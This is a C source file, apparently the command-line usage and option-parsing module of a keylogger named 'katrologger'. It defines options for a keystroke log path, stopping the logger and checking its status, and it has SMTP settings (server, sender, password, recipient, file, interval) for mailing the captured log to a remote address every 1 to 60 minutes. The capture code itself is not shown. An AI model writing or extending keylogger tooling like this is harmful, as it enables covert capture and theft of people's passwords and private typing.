#include "usage.h"

void help() {
    fprintf(stderr,
    "Usage:\n\tkatrologger [options]\n\n"
    "\t-h, --help\n");
  exit(0);
}

void smtp_helper(){
    printf("Usage:\n\t--smtp-url smtp://smtp.exemple.com:port\n\t--mail-from <address>\n\t--pass <password>\n\t--mail-rcpt <address>\n\t--smtp-file /path/keylogger.log\n\t--time 1-60 Minutes\n");
    exit(0);
}

void usage() {
    printf("[Options]:\n");
    printf("\t-o, --output           File Path\n");
    printf("\t-k, --kill             Stop\n");
    printf("\t-s, --status           Status\n");
    printf("\t-h, --help             Help\n");

    printf("\nSend Mail:\n");
    printf("\t--smtp-status          SMTP Status\n");
    printf("\t--smtp-help            Help\n");
    printf("\t--smtp-url             SMTP Server\n");
    printf("\t--mail-from            Source Email\n");
    printf("\t--pass                 Password Email\n");
    printf("\t--mail-rcpt            Receipt Email\n");
    printf("\t--smtp-file            Upload File\n");
    printf("\t--time                 Update Time, 1-60 Minutes\n");

    printf("\nExample:\n\tkeylogger --output /var/log/<file>\n");
    exit(0);
}

int keylogger_usage(int argc, char **argv) {

  flag_kill = 0;
  flag_smtp = 0;
  flag_status = 0;
  smtp_status = 0;
  smtp_help = 0;

struct option long_options[] = {
  {"help",   no_argument,          0, 'h'},
  {"output", required_argument,    0, 'o'},
  {"kill",   no_argument,          0, 'k'},
  {"status", no_argument,          0, 's'},
  {"smtp-status", no_argument,     0,  1 },
  {"smtp-help", no_argument,       0,  2 },
  {"smtp-url",  required_argument, 0,  0 },
  {"mail-from", required_argument, 0,  0 },
  {"mail-rcpt", required_argument, 0,  0 },
  {"pass", required_argument,      0,  0 },
  {"smtp-file", required_argument, 0,  0 },
  {"time", required_argument,      0,  0 },
  {0, 0, 0, 0}
};

if (argc < 2)
  help();

while((opt = getopt_long(argc, argv, "hkso:01", long_options, NULL)) != -1) {
  switch (opt) {
    case 0:
        if (argc == 13) {
          flag_smtp = 1;
        } else {
          smtp_helper();
        }
      break;
    case 1:
        smtp_status = 1;
      break;
    case 2:
        smtp_help = 1;
      break;
    case 'h':
        usage();
      break;
    case 'o':
        strncpy(outfile, optarg, 99);
      break;
    case 'k':
        flag_kill = 1;
      break;
    case 's':
        flag_status = 1;
        break;
    case '?':
      fprintf(stderr, "Invalid Argument => -%c\n", optopt);
      exit(1);
    default :
        fprintf(stderr, "!!! No Arguments !!!\n");
        exit(1);
      }
    }
}
